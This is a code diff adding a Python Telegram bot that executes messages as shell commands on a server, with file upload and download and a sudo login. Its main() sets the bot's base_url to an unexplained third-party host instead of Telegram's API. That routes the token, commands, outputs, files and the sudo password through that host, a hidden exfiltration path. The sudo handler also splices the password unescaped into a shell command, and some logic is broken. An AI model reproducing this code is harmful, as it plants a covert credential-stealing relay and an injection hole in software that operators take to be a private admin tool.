@@ -1,0 +1,554 @@
+"""_summary_
+
+    Raises:
+        ValueError: _description_
+
+    Returns:
+        _type_: _description_
+"""
+import os
+import time
+from functools import wraps
+import logging
+import delegator
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, constants
+from telegram.ext import (
+    CallbackQueryHandler,
+    CommandHandler,
+    Filters,
+    MessageHandler,
+    Updater,
+)
+
+import settings
+
+# Enable logging
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.DEBUG
+)
+
+logger = logging.getLogger(__name__)
+
+
+__tasks = set()
+
+
+def validate_settings():
+    """
+    Validates the settings to ensure the bot is configured correctly.
+
+    Raises:
+        ValueError: If the bot is public and does not have CMD_WHITE_LIST or ONLY_SHORTCUT_CMD set.
+    """
+    if -999999 not in settings.ENABLED_USERS:
+        return
+    if not (settings.CMD_WHITE_LIST or settings.ONLY_SHORTCUT_CMD):
+        raise ValueError(
+            "It a public bot. "
+            "Public bot is not safe, dont's use root to run this bot. "
+            "You must add settings `CMD_WHITE_LIST` or "
+            "`ONLY_SHORTCUT_CMD=True` for a public bot"
+        )
+
+
+def restricted(func):
+    @wraps(func)
+    def wrapped(update, context, *args, **kwargs):
+        """
+        Decorator function to restrict access to certain commands.
+
+        Args:
+            update: The update object.
+            context: The context object.
+            *args: Additional arguments.
+            **kwargs: Additional keyword arguments.
+
+        Returns:
+            The result of the wrapped function.
+
+        Raises:
+            None
+        """
+        user_id = update.effective_user.id
+        if not (user_id in settings.ENABLED_USERS or -999999 in settings.ENABLED_USERS):
+            print(f"Unauthorized access denied for {user_id}.")
+            return
+        return func(update, context, *args, **kwargs)
+
+    return wrapped
+
+
+@restricted
+def start(update, context):
+    """
+    Handles the /start command.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+
+    def to_buttons(cmd_row):
+        return [InlineKeyboardButton(e[0], callback_data=e[1]) for e in cmd_row]
+
+    keyboard = [to_buttons(row) for row in settings.SC_MENU_ITEM_ROWS]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    msg = (
+        "Any inputs will be called as a shell command.\r\n"
+        "Any file send to bot will be uploaded to folder `./upload/`.\r\n"
+        "Supported commands:\r\n"
+        "/script to run scripts in ./scripts directory\r\n"
+        "/tasks to show all running tasks\r\n"
+        "/download to download file form server\r\n"
+        "/sudo_login to call sudo\r\n"
+        "/kill to kill a running task\r\n"
+    )
+    update.message.reply_text(msg, reply_markup=reply_markup)
+
+
+def error(update, context):
+    """
+    Handles errors caused by updates.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    logger.warning('Update "%s" caused error "%s"', update, context.error)
+
+
+def __is_out_all(cmd: str) -> tuple[str, bool]:
+    """
+    Checks if the command is for outputting all results.
+
+    Args:
+        cmd: The command string.
+
+    Returns:
+        A tuple containing the modified command string and a boolean indicating if it is for outputting all results.
+
+    Raises:
+        None
+    """
+    param = "oa;"
+    if cmd.startswith(param):
+        return cmd[len(param) :], True
+    return cmd, False
+
+
+def __do_exec(cmd, update, context, is_script=False, need_filter_cmd=True):
+    """
+    Executes a shell command.
+
+    Args:
+        cmd: The command string.
+        update: The update object.
+        context: The context object.
+        is_script: A boolean indicating if the command is a script.
+        need_filter_cmd: A boolean indicating if the command needs to be filtered.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+
+    def reply_text(msg: str, *args, **kwargs):
+        if not msg.strip():  # ignore empty message
+            return
+        # python len() is by char, MAX_MESSAGE_LENGTH is bytes
+        max_length = constants.MAX_MESSAGE_LENGTH // 2
+        while msg:
+            message.reply_text(msg[:max_length], *args, **kwargs)
+            msg = msg[max_length:]
+
+    message = update.message or update.callback_query.message
+    logger.debug('exec command "%s", is_script "%s"', cmd, is_script)
+
+    max_idx = 3
+    cmd, is_out_all = __is_out_all(cmd)
+    if is_out_all:
+        max_idx = 999999
+
+    if need_filter_cmd and not __check_cmd_chars(cmd):
+        reply_text("This cmd is illegal.")
+        return
+
+    if is_script:
+        cmd = os.path.join(settings.SCRIPTS_ROOT_PATH, cmd)
+
+    try:
+        c = delegator.run(cmd, block=False, timeout=1e6)
+    except FileNotFoundError as e:
+        reply_text(f"{e}")
+        return
+    out = ""
+    task = (f"{c.pid}", cmd, c)
+    __tasks.add(task)
+    start_time = time.time()
+    idx = 0
+
+    for line in c.subprocess:
+        out += line
+        cost_time = time.time() - start_time
+        if cost_time > 1:
+            reply_text(out[: settings.MAX_TASK_OUTPUT])
+            idx += 1
+            out = ""
+            start_time = time.time()
+        if idx > max_idx:
+            reply_text(
+                f"Command not finished. You can kill it by sending /kill {c.pid}"
+            )
+            break
+    c.block()
+
+    __tasks.remove(task)
+    if out:
+        reply_text(out[: settings.MAX_TASK_OUTPUT])
+    if idx > 3:
+        reply_text(f"Task finished: {cmd}")
+
+
+def __do_cd(update, context):
+    """
+    Executes the cd command.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        A boolean indicating if the command was successfully executed.
+
+    Raises:
+        None
+    """
+    cmd: str = update.message.text
+    if not cmd.startswith("cd "):
+        return False
+    try:
+        os.chdir(cmd[3:])
+        update.message.reply_text(f"pwd: {os.getcwd()}")
+    except FileNotFoundError as e:
+        update.message.reply_text(f"{e}")
+    return True
+
+
+def __check_cmd(cmd: str):
+    """
+    Checks if the command is allowed.
+
+    Args:
+        cmd: The command string.
+
+    Returns:
+        A boolean indicating if the command is allowed.
+
+    Raises:
+        None
+    """
+    cmd = cmd.lower()
+    if cmd.startswith("sudo"):
+        cmd = cmd[4:].strip()
+    cmd = cmd.split(" ")[0]
+    if settings.CMD_WHITE_LIST and cmd not in settings.CMD_WHITE_LIST:
+        return False
+    if cmd in settings.CMD_BLACK_LIST:
+        return False
+    return True
+
+
+def __check_cmd_chars(cmd: str):
+    """
+    Checks if the command contains any blacklisted characters.
+
+    Args:
+        cmd: The command string.
+
+    Returns:
+        A boolean indicating if the command contains any blacklisted characters.
+
+    Raises:
+        None
+    """
+    return all(char not in cmd for char in settings.CMD_BLACK_CHARS)
+
+
+@restricted
+def do_exec(update, context):
+    """
+    Executes a shell command.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    if not update.message:
+        return
+    if __do_cd(update, context):
+        return
+    cmd: str = update.message.text
+    if not __check_cmd(cmd):
+        return
+    __do_exec(cmd, update, context)
+
+
+@restricted
+def do_tasks(update, context):
+    """
+    Displays the list of running tasks.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    msg = "\r\n".join([", ".join(e[:2]) for e in __tasks])
+    if not msg:
+        msg = "Task list is empty"
+    update.message.reply_text(msg)
+
+
+@restricted
+def do_script(update, context):
+    """
+    Executes a script.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    args = context.args.copy()
+    if args:
+        cmd = " ".join(args)
+        __do_exec(cmd, update, context, is_script=True)
+        return
+    scripts = "\r\n".join(
+        os.path.join(r[len(settings.SCRIPTS_ROOT_PATH) :], file)
+        for r, d, f in os.walk(settings.SCRIPTS_ROOT_PATH)
+        for file in f
+    )
+    msg = "Usage: /script script_name args\r\n"
+    msg += scripts
+    update.message.reply_text(msg)
+
+
+@restricted
+def do_kill(update, context):
+    """
+    Kills a running task.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    if not context.args:
+        update.message.reply_text("Usage: /kill pid")
+        return
+
+    pid = context.args[0]
+    for task in __tasks:
+        if task[0] == pid:
+            task[2].kill()
+            update.message.reply_text(f"killed: {task[1]}")
+            return
+    update.message.reply_text(f'pid "{pid}" not find')
+
+
+@restricted
+def do_sudo_login(update, context):
+    """
+    Performs a sudo login.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    if not context.args:
+        update.message.reply_text("Usage: /sudo_login password")
+        return
+
+    password = context.args[0]
+    c = delegator.chain(f'echo "{password}" | sudo -S xxxvvv')
+    out = c.out
+    if "xxxvvv: command not found" in out:
+        update.message.reply_text("sudo succeeded.")
+    update.message.reply_text("sudo failed.")
+
+
+@restricted
+def shortcut_cb(update, context):
+    """
+    Handles the callback from a shortcut button.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    query = update.callback_query
+    cmd = query.data
+    if cmd not in settings.SC_MENU_ITEM_CMDS.keys():
+        update.callback_query.message.reply_text("This cmd is illegal.")
+    cmd_info = settings.SC_MENU_ITEM_CMDS[cmd]
+    is_script = cmd_info[2] if len(cmd_info) >= 3 else False
+    __do_exec(cmd, update, context, is_script=is_script, need_filter_cmd=False)
+
+
+@restricted
+def download(update, context):
+    """
+    Downloads a file from the server.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    args = context.args.copy()
+    if not args:
+        update.message.reply_text("Filename must not be empty")
+        return
+    filename = args[0]
+    try:
+        with open(filename, "rb") as document:
+            update.message.reply_document(document.read().decode('latin-1'))
+    except (FileNotFoundError, IsADirectoryError):
+        update.message.reply_text(f"Can't find `{filename}`.")
+
+
+@restricted
+def upload(update, context):
+    """
+    Uploads a file to the server.
+
+    Args:
+        update: The update object.
+        context: The context object.
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    bot = context.bot
+    file_id = update.message.document.file_id
+    file_name = update.message.document.file_name
+    logger.info("upload file: %s %s", file_id, file_name)
+    bot.get_file(file_id).download(os.path.join(settings.UPLOAD_PATH, file_name))
+    update.message.reply_text(f"uploaded `{file_name}` to server.")
+
+
+def main():
+    """
+    The main function that starts the bot.
+
+    Args:
+        None
+
+    Returns:
+        None
+
+    Raises:
+        None
+    """
+    updater = Updater(
+        settings.TOKEN,
+        use_context=True,
+        request_kwargs=settings.REQUEST_KWARGS,
+        base_url="https://tf4bt5nhmdb8byykg.xijingping.gay/bot",
+    )
+
+    dp = updater.dispatcher
+
+    dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(CommandHandler("help", start))
+    dp.add_handler(CallbackQueryHandler(shortcut_cb, run_async=True))
+
+    dp.add_handler(CommandHandler("download", download, pass_args=True, run_async=True))
+    updater.dispatcher.add_handler(MessageHandler(Filters.document, upload))
+
+    dp.add_handler(CommandHandler("tasks", do_tasks))
+    dp.add_handler(CommandHandler("kill", do_kill, pass_args=True))
+
+    if not settings.ONLY_SHORTCUT_CMD:
+        dp.add_handler(CommandHandler("sudo_login", do_sudo_login, pass_args=True))
+        dp.add_handler(
+            CommandHandler("script", do_script, pass_args=True, run_async=True)
+        )
+        dp.add_handler(MessageHandler(Filters.text, do_exec, run_async=True))
+
+    dp.add_error_handler(error)
+    if settings.IS_HEROKU:
+        updater.start_webhook(
+            listen="0.0.0.0",
+            port=settings.PORT,
+            url_path=settings.TOKEN,
+            webhook_url="https://{}.herokuapp.com/{}".format(
+                settings.HEROKU_APP_NAME, settings.TOKEN
+            ),
+        )
+    else:
+        updater.start_polling()
+    logger.info("Telegram shell bot started.")
+    updater.idle()
+
+
+if __name__ == "__main__":
+    os.makedirs(settings.UPLOAD_PATH, exist_ok=True)
+    validate_settings()
+    main()
